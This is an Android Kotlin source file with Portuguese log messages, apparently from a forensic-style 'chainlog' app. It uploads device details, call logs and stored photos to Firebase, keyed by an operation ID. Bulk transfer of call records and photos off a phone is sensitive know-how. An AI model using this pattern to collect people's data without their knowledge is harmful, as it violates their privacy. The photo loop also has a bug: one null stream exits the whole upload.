package com.example.chainlog.firebase

import android.content.Context
import android.util.Log
import com.example.chainlog.data.models.CallInfo
import com.example.chainlog.data.models.DeviceInfo
import com.example.chainlog.data.models.PhotoInfo
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import androidx.core.net.toUri
import java.util.UUID

object FirebaseUploader {

    private val db = FirebaseFirestore.getInstance()
    private val storage = FirebaseStorage.getInstance()

    fun initDevice(deviceId: String, operationId: String, device: DeviceInfo, onComplete: (Boolean) -> Unit) {

        Log.d("FirebaseUploader", "[initDevice] salvando dispositivo $deviceId")

        val deviceData = mapOf(
            "operationId" to operationId,
            "manufacturer" to device.manufacturer,
            "model" to device.model,
            "androidVersion" to device.androidVersion
        )

        db.collection("devices")
            .document(deviceId)
            .set(deviceData)
            .addOnSuccessListener { onComplete(true) }
            .addOnFailureListener { onComplete(false) }
    }

    fun uploadCalls(deviceId: String, calls: List<CallInfo>, onComplete: (Boolean) -> Unit) {
        val batch = db.batch()
        val callsRef = db.collection("devices").document(deviceId).collection("calls")

        calls.forEach { call ->
            val doc = callsRef.document()
            val callData = mapOf(
                "number" to call.number,
                "type" to call.type,
                "date" to call.date,
                "duration" to call.duration
            )
            batch.set(doc, callData)
        }

        batch.commit()
            .addOnSuccessListener { onComplete(true) }
            .addOnFailureListener { onComplete(false) }
    }

    fun uploadPhotos(context: Context, deviceId: String, photos: List<PhotoInfo>, onComplete: (Boolean) -> Unit) {

        var successCount = 0
        var failCount = 0

        photos.forEach { photo ->
            try {
                val uri = photo.uri.toUri()
                val inputStream = context.contentResolver.openInputStream(uri)

                if(inputStream == null) {
                    failCount++
                    if (successCount + failCount == photos.size) {
                        onComplete(false)
                    }
                    return
                }

                var fileUUID = UUID.randomUUID().toString()
                val fileName = "$fileUUID.jpg"
                val storageRef = storage.reference.child("photos/$deviceId/$fileName")
                val uploadTask = storageRef.putStream(inputStream)

                uploadTask
                    .addOnSuccessListener {
                        storageRef.downloadUrl.addOnSuccessListener { downloadUrl ->
                            val photoData = mapOf(
                                "uri" to photo.uri,
                                "dateTaken" to photo.dateTaken,
                                "storageUrl" to downloadUrl.toString()
                            )

                            val photosRef = db
                                .collection("devices")
                                .document(deviceId)
                                .collection("photos")
                                .document(fileUUID)

                            photosRef.set(photoData)
                                .addOnSuccessListener {
                                    successCount++
                                    if (successCount + failCount == photos.size) {
                                        onComplete(failCount == 0)
                                    }
                                }
                                .addOnFailureListener {
                                    failCount++
                                    if (successCount + failCount == photos.size) {
                                        onComplete(false)
                                    }
                                }
                        }
                    }
                    .addOnFailureListener {
                        failCount++
                        if (successCount + failCount == photos.size) {
                            onComplete(false)
                        }
                    }
                    .addOnCompleteListener {
                        inputStream.close()
                    }
            } catch (e: Exception) {
                e.printStackTrace()
                failCount++
                if (successCount + failCount == photos.size) {
                    onComplete(false)
                }
            }
        }

    }

//    fun uploadPhotos(deviceId: String, photos: List<PhotoInfo>, onComplete: (Boolean) -> Unit) {
//        val batch = db.batch()
//        val photosRef = db.collection("devices").document(deviceId).collection("photos")
//
//        photos.forEach { photo ->
//            val doc = photosRef.document()
//            val photoData = mapOf(
//                "uri" to photo.uri,
//                "dateTaken" to photo.dateTaken
//            )
//            batch.set(doc, photoData)
//        }
//
//        batch.commit()
//            .addOnSuccessListener { onComplete(true) }
//            .addOnFailureListener { onComplete(false) }
//    }
}